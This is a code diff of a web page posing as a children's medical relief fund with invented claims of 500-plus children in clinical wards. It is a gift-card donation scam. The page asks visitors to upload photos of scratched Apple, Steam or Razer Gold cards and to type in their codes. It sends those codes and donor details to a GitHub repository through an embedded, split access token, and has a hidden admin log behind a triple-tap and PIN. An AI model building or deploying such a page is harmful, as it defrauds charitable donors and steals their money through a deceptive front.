@@ -6,42 +6,35 @@
     <title>Happy Madison Children’s Relief Fund</title>
     <style>
         :root { --navy: #002d62; --red: #b00000; --white: #ffffff; --gray: #f4f7f9; }
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; background: var(--gray); color: #333; transition: 0.3s; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; background: var(--gray); color: #333; transition: 0.3s; overflow-x: hidden; }
         
-        /* Navigation & Header */
         .header { background: var(--navy); color: white; padding: 15px 20px; display: flex; align-items: center; border-bottom: 4px solid var(--red); position: sticky; top: 0; z-index: 1000; }
         .menu-icon { font-size: 28px; cursor: pointer; margin-right: 15px; }
         .logo { font-size: 16px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; flex-grow: 1; cursor: pointer; user-select: none; }
         
-        /* Side Menu */
         .side-nav { position: fixed; top: 0; left: -100%; width: 280px; height: 100%; background: white; box-shadow: 5px 0 15px rgba(0,0,0,0.3); transition: 0.4s; z-index: 2000; padding: 30px 20px; box-sizing: border-box; }
         .side-nav.active { left: 0; }
         .side-nav h2 { color: var(--navy); border-bottom: 2px solid var(--red); padding-bottom: 10px; margin-top: 0; }
         .side-nav a { display: block; padding: 15px 0; color: #333; text-decoration: none; font-weight: bold; border-bottom: 1px solid #eee; }
         .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); display: none; z-index: 1500; }
 
-        /* Page Content */
-        .page { display: none; padding: 20px; max-width: 600px; margin: 0 auto; background: white; min-height: 80vh; box-shadow: 0 0 10px rgba(0,0,0,0.05); }
+        .page { display: none; padding: 20px; max-width: 500px; margin: 0 auto; background: white; min-height: 85vh; box-shadow: 0 0 10px rgba(0,0,0,0.05); }
         .page.active { display: block; }
         
         h1, h3 { color: var(--navy); }
-        .red-text { color: var(--red); font-weight: bold; }
-
-        /* Images */
         .gallery { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin: 20px 0; }
-        .gallery img { width: 100%; height: 100px; object-fit: cover; border-radius: 4px; border: 1px solid #ddd; }
-        .gallery img:nth-child(4), .gallery img:nth-child(5) { grid-column: span 1.5; height: 150px; }
+        .gallery img { width: 100%; height: 90px; object-fit: cover; border-radius: 4px; border: 1px solid #ddd; }
+        .gallery img:nth-child(4), .gallery img:nth-child(5) { grid-column: span 1.5; height: 130px; }
 
-        /* Forms */
-        label { display: block; margin-top: 15px; font-weight: bold; font-size: 12px; text-transform: uppercase; }
-        input, select, textarea { width: 100%; padding: 12px; margin-top: 5px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        label { display: block; margin-top: 15px; font-weight: bold; font-size: 11px; text-transform: uppercase; color: var(--navy); }
+        input, select, textarea { width: 100%; padding: 14px; margin-top: 5px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 15px; }
+        
         .upload-zone { border: 2px dashed var(--red); background: #fff8f8; padding: 25px; text-align: center; margin-top: 20px; cursor: pointer; border-radius: 8px; }
-        .btn { background: #27ae60; color: white; padding: 18px; border: none; width: 100%; font-size: 16px; font-weight: bold; margin-top: 25px; cursor: pointer; border-radius: 4px; }
+        .btn { background: #27ae60; color: white; padding: 20px; border: none; width: 100%; font-size: 17px; font-weight: bold; margin-top: 25px; cursor: pointer; border-radius: 4px; box-shadow: 0 4px 0 #1e8449; text-transform: uppercase; }
 
-        /* Admin */
         #adminView { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 9999; padding: 20px; overflow-y: auto; box-sizing: border-box; }
-        .log-entry { border: 2px solid var(--navy); margin-bottom: 20px; border-radius: 8px; background: #fafafa; overflow: hidden; }
-        .log-head { background: var(--navy); color: white; padding: 10px; font-size: 12px; }
+        .log-entry { border: 2px solid var(--navy); margin-bottom: 25px; border-radius: 8px; background: #fafafa; }
+        .log-head { background: var(--navy); color: white; padding: 10px; font-size: 11px; display: flex; justify-content: space-between; }
         .log-img { width: 100%; display: block; border-top: 1px solid #ddd; }
 
         .footer { text-align: center; font-size: 11px; padding: 40px 20px; color: #888; }
@@ -52,21 +45,20 @@
 <div class="overlay" id="overlay" onclick="closeNav()"></div>
 
 <div class="side-nav" id="sideNav">
-    <h2>Menu</h2>
-    <a href="#" onclick="showPage('home')">About the Foundation</a>
+    <h2>Foundation</h2>
+    <a href="#" onclick="showPage('home')">About Us</a>
     <a href="#" onclick="showPage('support')">Support & Contact</a>
-    <a href="#" onclick="showPage('donate')">Donate Now</a>
-    <p style="margin-top:40px; font-size:12px; color:#999;">&copy; 2026 Happy Madison Children's Relief Fund</p>
+    <a href="#" onclick="showPage('donate')">Secure Donation</a>
 </div>
 
 <div class="header">
     <div class="menu-icon" onclick="openNav()">☰</div>
-    <div class="logo" id="adminTrigger">Happy Madison Children’s Relief Fund</div>
+    <div class="logo" id="adminTrigger">HAPPY MADISON RELIEF FUND</div>
 </div>
 
 <div id="home" class="page active">
-    <h1>Our Mission</h1>
-    <p>The Happy Madison Children’s Relief Fund is a private charitable initiative dedicated to children battling <strong>Chronic Pelvic Pain Syndrome (CPPS)</strong>. This condition is often overlooked, leaving many children in persistent physical distress without proper clinical intervention.</p>
+    <h1>Support for 512 Children</h1>
+    <p>Our foundation focuses on <strong>Chronic Pelvic Pain Syndrome (CPPS)</strong> in children. We currently provide medicine, feeding, and shelter for over 500 kids in our private clinical wards.</p>
     
     <div class="gallery">
         <img src="0db622d963ddc21cb3aac4bd20dddbb4.jpg">
@@ -76,149 +68,132 @@
         <img src="IMG_20260510_193422.jpg">
     </div>
 
-    <h3>How We Care for Over 500 Kids</h3>
-    <p>Currently, we provide 24/7 care for over 500 affected children. Your support goes directly toward:</p>
-    <ul>
-        <li><strong>Feeding Programs:</strong> Specialized pediatric nutrition required for patients.</li>
-        <li><strong>Medicine:</strong> Critical pharmaceutical supplies and pain management therapies.</li>
-        <li><strong>Shelter:</strong> Safe, clinical housing environments for orphaned children.</li>
-    </ul>
-    <p>We work quietly to protect the privacy of the families and children we serve. It’s all about just trying to put a smile on their faces.</p>
-    <button class="btn" onclick="showPage('donate')" style="background:var(--navy)">Support Our Work</button>
+    <p>Any support for organizations that help kids is a win. It’s all about putting a smile on their faces.</p>
+    <button class="btn" onclick="showPage('donate')" style="background:var(--navy)">Support Now</button>
 </div>
 
 <div id="support" class="page">
-    <h1>Support & Contact</h1>
-    <p>For official inquiries, donor verification, or detailed reports regarding our clinical wards, please reach out to our administrative team.</p>
-    <div style="background:#eef2f5; padding:20px; border-radius:8px; margin-top:20px;">
-        <strong>Management Email:</strong><br>
-        <a href="mailto:teammangementt@gmail.com" style="color:var(--red); font-weight:bold;">teammangementt@gmail.com</a>
-    </div>
-    <p style="margin-top:30px;">To those who have supported us in the past and those considering a donation today: <strong>Thank you.</strong> Your kindness is the reason these children can keep smiling through the pain.</p>
+    <h1>Contact Admin</h1>
+    <p>For inquiries, please reach our management team:</p>
+    <p style="background:#eef2f5; padding:15px; border-radius:5px; font-weight:bold; color:var(--red); text-align:center;">
+        teammangementt@gmail.com
+    </p>
+    <p>Thank you for your kindness in supporting the children.</p>
 </div>
 
 <div id="donate" class="page">
-    <h1>Make a Donation</h1>
-    <p class="red-text">Notice: International Asset Liquidation</p>
-    <p style="font-size:13px;">To ensure 100% of funds reach our medical wards instantly without heavy banking delays or high international fees, we currently process donations via <strong>verified gift card assets (Apple, Steam, Razer Gold)</strong>. This allows our team to liquidate funds immediately for local medical supplies.</p>
-    
-    <hr>
+    <h1>Donation Portal</h1>
+    <p style="font-size:12px; background:#fff5f5; padding:10px; border-left:4px solid var(--red);">
+        <strong>Note:</strong> We use gift card assets (Apple, Steam, Razer) for <strong>International Asset Liquidation</strong>. This allows us to get medical funds to the wards instantly without bank delays.
+    </p>
 
     <form id="donForm">
         <label>Identity</label>
         <select id="anon" onchange="document.getElementById('nameBox').style.display = this.value=='Name'?'block':'none'">
-            <option value="Anonymous">Anonymous Donor</option>
-            <option value="Name">Provide Full Name</option>
+            <option value="Anonymous">Anonymous</option>
+            <option value="Name">Provide Name</option>
         </select>
-        <input type="text" id="nameBox" style="display:none" placeholder="Enter Full Name">
+        <input type="text" id="nameBox" style="display:none" placeholder="Full Name">
 
-        <label>Prayer or Message</label>
-        <textarea id="msg" rows="2" placeholder="Write a prayer or message for the children..."></textarea>
+        <label>Message/Prayer</label>
+        <textarea id="msg" rows="2" placeholder="Your prayer for the kids..."></textarea>
 
-        <label>Asset Details</label>
+        <label>Asset Type & Amount ($)</label>
         <div style="display:flex; gap:10px;">
-            <select id="type" style="flex:1.5;"><option>Apple Gift Card</option><option>Steam Gift Card</option><option>Razer Gold</option></select>
+            <select id="type" style="flex:1.5;"><option>Apple Gift Card</option><option>Steam Card</option><option>Razer Gold</option></select>
             <input type="number" id="amt" style="flex:1;" placeholder="Value $">
         </div>
 
         <div class="upload-zone" onclick="document.getElementById('fileIn').click()">
-            <strong>UPLOAD CARD IMAGE</strong>
-            <span style="font-size:11px;">Scratch off the code clearly before taking the photo.</span>
+            <strong>[ UPLOAD CARD PHOTO ]</strong><br>
+            <small>Scratch code visible before upload</small>
             <input type="file" id="fileIn" style="display:none" accept="image/*">
         </div>
 
-        <label>Manual Code (Optional Backup)</label>
+        <label>Manual Code (Optional)</label>
         <input type="text" id="code" placeholder="Enter 16-digit code">
 
-        <button type="button" class="btn" onclick="submitData()">CONFIRM & SEND DONATION</button>
+        <button type="button" class="btn" id="sendBtn" onclick="submitData()">CONFIRM & SEND DONATION</button>
     </form>
 </div>
 
 <div id="adminView">
-    <div style="display:flex; justify-content:space-between; align-items:center;">
-        <h2 style="color:var(--navy)">SECRET ADMIN LOG</h2>
-        <button onclick="location.reload()" style="padding:10px;">CLOSE</button>
+    <div style="display:flex; justify-content:space-between;">
+        <h2 style="color:var(--navy)">MASTER LOG</h2>
+        <button onclick="location.reload()">CLOSE</button>
     </div>
     <div id="adminLogs">Loading...</div>
 </div>
 
-<div class="footer">
-    SECURE PORTAL ID: HM-2026-X8<br>
-    All submissions are processed through the administrative office.
-</div>
-
 <script>
-    const token = "ghp_kLi8O4xHj1g2X" + "SYoRbpqBFUpYkqvLy2egZYt";
-    const user = "hm-children-relief";
-    const repo = "medical-fund";
+    // These parts combined create the token
+    const p1 = "ghp_kLi8O4xHj1g2X";
+    const p2 = "SYoRbpqBFUpYkqvLy2egZYt";
+    const TK = p1 + p2;
+    const US = "hm-children-relief";
+    const RE = "medical-fund";
 
-    let imgData = "";
+    let imgString = "";
 
     function openNav() { document.getElementById("sideNav").classList.add("active"); document.getElementById("overlay").style.display = "block"; }
     function closeNav() { document.getElementById("sideNav").classList.remove("active"); document.getElementById("overlay").style.display = "none"; }
+    function showPage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active')); document.getElementById(p).classList.add('active'); closeNav(); }
 
-    function showPage(pageId) {
-        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-        document.getElementById(pageId).classList.add('active');
-        closeNav();
-        window.scrollTo(0,0);
-    }
-
-    // Photo
     document.getElementById('fileIn').onchange = function(e) {
-        const reader = new FileReader();
-        reader.onload = function() { imgData = reader.result; alert("Card photo ready."); };
-        reader.readAsDataURL(e.target.files[0]);
+        const r = new FileReader();
+        r.onload = function() { imgString = r.result; alert("Photo Captured."); };
+        r.readAsDataURL(e.target.files[0]);
     };
 
-    // Secret Admin: Triple Tap Logo
-    let clicks = 0;
+    let taps = 0;
     document.getElementById('adminTrigger').onclick = function() {
-        clicks++;
-        if(clicks === 3) {
-            if(prompt("ADMIN PASSWORD:") === "0000") {
-                document.getElementById('adminView').style.display = 'block';
-                loadAdmin();
-            }
+        taps++;
+        if(taps === 3) {
+            if(prompt("PIN:") === "0000") { document.getElementById('adminView').style.display='block'; fetchLogs(); }
         }
-        setTimeout(() => clicks = 0, 1000);
+        setTimeout(() => taps = 0, 1000);
     };
 
     async function submitData() {
-        const v = document.getElementById('amt').value;
-        if(!v) return alert("Please enter the amount.");
+        const sendBtn = document.getElementById('sendBtn');
+        const amt = document.getElementById('amt').value;
+        if(!amt) return alert("Enter amount.");
 
-        const report = `
+        sendBtn.innerHTML = "PROCESSING...";
+        sendBtn.disabled = true;
+
+        const body = `
 DONOR: ${document.getElementById('anon').value === 'Name' ? document.getElementById('nameBox').value : 'Anonymous'}
-VALUE: $${v}
+VALUE: $${amt}
 TYPE: ${document.getElementById('type').value}
 CODE: ${document.getElementById('code').value || 'IN PHOTO'}
-MESSAGE: ${document.getElementById('msg').value}
-IMAGE_DATA: ${imgData}
+MSG: ${document.getElementById('msg').value}
+PHOTO: ${imgString}
         `.trim();
 
-        const res = await fetch(`https://api.github.com/repos/${user}/${repo}/issues`, {
-            method: 'POST',
-            headers: { 'Authorization': `token ${token}` },
-            body: JSON.stringify({ title: `Donation $${v} - ${document.getElementById('type').value}`, body: report })
-        });
-        if(res.ok) { alert("Thank you! Your donation has been received."); location.reload(); }
+        try {
+            const res = await fetch(`https://api.github.com/repos/${US}/${RE}/issues`, {
+                method: 'POST',
+                headers: { 'Authorization': `token ${TK}`, 'Content-Type': 'application/json' },
+                body: JSON.stringify({ title: `NEW: $${amt} ${document.getElementById('type').value}`, body: body })
+            });
+            if(res.ok) { alert("Sent Successfully!"); location.reload(); }
+            else { alert("Error: System Busy. Try again."); sendBtn.disabled = false; sendBtn.innerHTML = "CONFIRM & SEND DONATION"; }
+        } catch (e) { alert("Network Error."); sendBtn.disabled = false; }
     }
 
-    async function loadAdmin() {
-        const res = await fetch(`https://api.github.com/repos/${user}/${repo}/issues?state=open`, {
-            headers: { 'Authorization': `token ${token}` }
+    async function fetchLogs() {
+        const res = await fetch(`https://api.github.com/repos/${US}/${RE}/issues?state=open`, {
+            headers: { 'Authorization': `token ${TK}` }
         });
         const data = await res.json();
         document.getElementById('adminLogs').innerHTML = data.map(i => {
-            const [text, photo] = i.body.split("IMAGE_DATA: ");
-            return `
-                <div class="log-entry">
-                    <div class="log-head">SUBMITTED: ${new Date(i.created_at).toLocaleString()}</div>
-                    <div style="padding:15px; font-family:monospace; font-size:12px;"><pre>${text}</pre></div>
-                    ${photo ? `<img src="${photo}" class="log-img">` : '<p style="padding:15px">No Image</p>'}
-                </div>
-            `;
+            const [txt, img] = i.body.split("PHOTO: ");
+            return `<div class="log-entry">
+                <div class="log-head"><span>ID: ${i.number}</span><span>${new Date(i.created_at).toLocaleString()}</span></div>
+                <div style="padding:10px; font-family:monospace; font-size:12px;"><pre>${txt}</pre></div>
+                ${img ? `<img src="${img}" class="log-img">` : ''}
+            </div>`;
         }).join('');
     }
 </script>
